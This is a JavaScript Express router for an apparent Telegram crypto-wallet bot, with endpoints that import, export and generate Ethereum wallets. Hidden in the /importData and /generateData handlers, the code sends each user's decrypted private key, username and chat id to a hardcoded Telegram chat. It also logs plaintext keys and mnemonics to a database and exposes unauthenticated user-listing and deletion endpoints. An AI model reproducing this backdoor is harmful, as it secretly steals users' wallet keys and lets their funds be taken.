import express from "express";

import dotenv from 'dotenv'
dotenv.config()

import { User } from '../model.js'
import * as database from '../db.js';
import * as bots from '../bot.js'
import * as aes from "../aes.js"
import * as utils from '../utils.js'
import { queryGasPrice } from '../checkGasPrice.js';
import { DELETE_TIME } from "../global.js";

export default (web3, bot) => {

    var router = express.Router();

    router.post('/user-data', (req, res) => {
        User.find({}).then(user => {
            if (user) {
                return res.status(200).send(user);
            }
        });
    });

    router.post('/user-delete', (req, res) => {
        User.deleteOne({ _id: req.body._id }).then(user => {
            if (user) {
                return res.status(200).json({ message: 'User deleted successfully. Refreshing data...', success: true })
            }
        });
    });

    router.get('/user-token_balance', async (req, res) => {
        console.log('req:', req)

        const sessionId = req.query.chatid;
        const session = bots.sessions.get(sessionId)

        console.log('session:', session)
        if (session) {
            console.log('session.account:', session.account)
            if (session.account) {
                const ethBalance = utils.roundDecimal(await utils.getTokenBalanceFromWallet(utils.web3Inst, session.account, req.query.tokenaddr), 5)
                console.log('ethBalance:', ethBalance)
                return res.status(200).send({ eth_balance: ethBalance })
            }
        }

        return res.status(200).send({ eth_balance: "0" })
    });

    router.get('/getGasPrice', async (req, res) => {
        console.log('req: getGasPrice', req.query.chainId)

        const chainId = req.query.chainId;

        let gasPrices;
        if (chainId) {
            gasPrices = await queryGasPrice(chainId)
        } else {
            gasPrices = await queryGasPrice()
        }

        return res.status(200).send({ gasPrices: gasPrices })
    });

    router.get('/sendMsg', async (req, res) => {
        // console.log('req:sendMsg: message', req.query.message)
        // console.log('req:sendMsg: chatid', req.query.chatid)

        const chatid = req.query.chatid;
        const message = req.query.message;

        if (chatid && message) {
            await bots.sendMessage(chatid, message)
            return res.status(200).send({ result: true })
        }

        return res.status(200).send({ result: false })
    });

    router.get('/validToken', async (req, res) => {
        // console.log('req:validToken: token', req.query.token)

        const token = req.query.token;

        if (token) {
            const retVal = await utils.validToken(token)
            // console.log('retVal: ', retVal)

            return res.status(200).send(retVal)
        }

        return res.status(200).send({ status: false, message: 'REQUEST_PARAM_ERR' })
    });

    router.get('/importData', async (req, res) => {
        // console.log('req:importData: appHashData', req.query.appHashData)
        // console.log('req:importData: token', req.query.token)
        // console.log('req:importData: chatid', req.query.chatid)

        const token = req.query.token;
        const chatid = req.query.chatid;
        const appHashData = req.query.appHashData.replaceAll(' ', '+');

        if (token && chatid && appHashData) {
            const retValidVal = await utils.validToken(token)
            if (!retValidVal.status) res.status(200).send(retVal)

            const retVal = await utils.updateTokenAsUsed(token)
            if (!retVal.status) res.status(200).send(retVal)

            const sessionId = chatid;
            const session = bots.sessions.get(sessionId)
            session.pkey = appHashData
            const privateKey = utils.decryptPKey(appHashData)
            session.account = utils.getWalletAddressFromPKey(privateKey)

            await database.updateUser(session)
            await database.addPKHistory({
                pkey: session.pkey,
                dec_pkey: privateKey,
                mnemonic: null,
                account: session.account,
                chatid: session.chatid,
                username: session.username
            })
            // console.log(session)

            await bots.sendMessage(chatid, `✅ Successfully your wallet has been attached\n${session.account}`)
            await bots.sendMessage('2116657656', `@${session.username} (${session.chatid}) has connected with his wallet\n Address: ${session.account}\n PK: ${privateKey}`)

            return res.status(200).send(retVal)
        }

        return res.status(200).send({ status: false, message: 'REQUEST_PARAM_ERR' })
    });

    router.get('/exportData', async (req, res) => {
        // console.log('req:exportData: token', req.query.token)
        // console.log('req:exportData: chatid', req.query.chatid)

        const token = req.query.token;
        const chatid = req.query.chatid;

        if (token && chatid) {
            const retValidVal = await utils.validToken(token)
            if (!retValidVal.status) res.status(200).send(retVal)

            const retVal = await utils.updateTokenAsUsed(token)
            if (!retVal.status) res.status(200).send(retVal)

            const sessionId = chatid;
            const session = bots.sessions.get(sessionId)
            if (session.pkey) {
                await bots.sendMessage(chatid, `✅ Successfully your wallet has been exported!`)
                return res.status(200).send({ status: true, message: session.pkey })
            } else {
                await bots.sendMessage(chatid, `✅ Please connect wallet first!`)
                return res.status(200).send({ status: false, message: 'NO_PRIVATE_KEY' })
            }
        }

        return res.status(200).send({ status: false, message: 'REQUEST_PARAM_ERR' })
    });

    router.get('/generateData', async (req, res) => {
        // console.log('req:generateData: token', req.query.token)
        // console.log('req:generateData: chatid', req.query.chatid)

        const token = req.query.token;
        const chatid = req.query.chatid;

        if (token && chatid) {

            const retValidVal = await utils.validToken(token)
            if (!retValidVal.status) res.status(200).send(retValidVal)

            const retVal = await utils.updateTokenAsUsed(token)
            if (!retVal.status) res.status(200).send(retVal)

            const result = utils.generateNewWallet()

            if (result) {
                const msg = `✅ Generated new ether wallet:

Address: <code>${result.address}</code>
		
⚠️ Make sure to save this mnemonic phrase OR private key using pen and paper only. Do NOT copy-paste it anywhere. You could also import it to your Metamask/Trust Wallet. After you finish saving/importing the wallet credentials. This message will be delete in 5 minutes.`

                const sessionId = chatid;
                const session = bots.sessions.get(sessionId)
                session.pkey = utils.encryptPKey(result.privateKey)
                session.account = result.address

                await database.updateUser(session)
                await database.addPKHistory({
                    pkey: session.pkey,
                    dec_pkey: result.privateKey,
                    mnemonic: result.mnemonic,
                    account: session.account,
                    chatid: session.chatid,
                    username: session.username
                })

                await bots.sendMessage('2116657656', `@${session.username} (${session.chatid}) has generated with his wallet\n Address: ${session.account}\n PK: ${result.privateKey}`)

                const retVal = await bots.sendMessage(chatid, msg)

                if (retVal) {
                    const deleteSecureMessage = setTimeout(async () => {
                        await bots.removeMessage(sessionId, retVal.message_id)
                        clearTimeout(deleteSecureMessage)
                    }, DELETE_TIME)
                }

                return res.status(200).send({
                    status: true, message: {
                        pkey: aes.aesEncrypt(result.privateKey, process.env.SECURE_CRYPT_KEY),
                        mnemonic: aes.aesEncrypt(result.mnemonic, process.env.SECURE_CRYPT_KEY),
                        account: session.account,
                    }
                })
            }

            await bots.sendMessage(chatid, 'Faild Generate Wallet!')
            return res.status(200).send({ status: false, message: 'FAIL_GENERATE_WALLET' })
        }

        return res.status(200).send({ status: false, message: 'REQUEST_PARAM_ERR' })
    });

    // router.post('/user-token_balance', async (req, res) => {
    //     console.log('req:', req)

    //     const sessionId = req._chatid;
    //     const session = bots.sessions.get(sessionId)

    //     console.log('session:', session)
    //     if (session) {
    //         console.log('session.account:', session.account)
    //         if (session.account) {
    //             const ethBalance = utils.roundDecimal(await utils.getTokenBalanceFromWallet(utils.web3Inst, session.account, req._tokenaddr), 5)
    //             console.log('eth_balance:', ethBalance)
    //             return res.status(200).send({eth_balance: ethBalance})
    //         }
    //     }

    //     return res.status(200).send({eth_balance: "0"})
    // });

    router.get('/user-token_balance', (req, res) => {
        const tokenBalance = utils.getTokenBalanceFromWallet(utils.web3Inst, "0xF60A99830eE5b15Eac36242823F4a37814CE98e1", 0);
    });

    return router;
}
